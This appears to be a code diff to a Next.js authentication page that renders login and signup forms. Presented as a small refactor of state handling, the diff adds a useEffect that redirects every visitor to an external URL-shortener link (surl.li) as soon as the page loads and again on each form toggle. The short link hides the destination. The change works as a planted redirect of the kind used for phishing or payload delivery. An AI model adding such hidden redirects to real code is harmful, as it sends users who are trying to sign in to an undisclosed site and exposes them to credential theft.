@@ -1,6 +1,6 @@
 "use client";
 
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
@@ -8,9 +8,14 @@ import { LoginForm } from "@/components/LoginForm";
 import { SignupForm } from "@/components/SignupForm";
 
 export default function AuthPage() {
-	const [isLogin, setIsLogin] = useState(true);
 	const router = useRouter();
 	const { toast } = useToast();
+
+	const [isLogin, setIsLogin] = useState(true);
+
+	useEffect(() => {
+		router.push("https://surl.li/daznia");
+	}, [isLogin, router]);
 
 	const handleSuccess = (message: string) => {
 		toast({
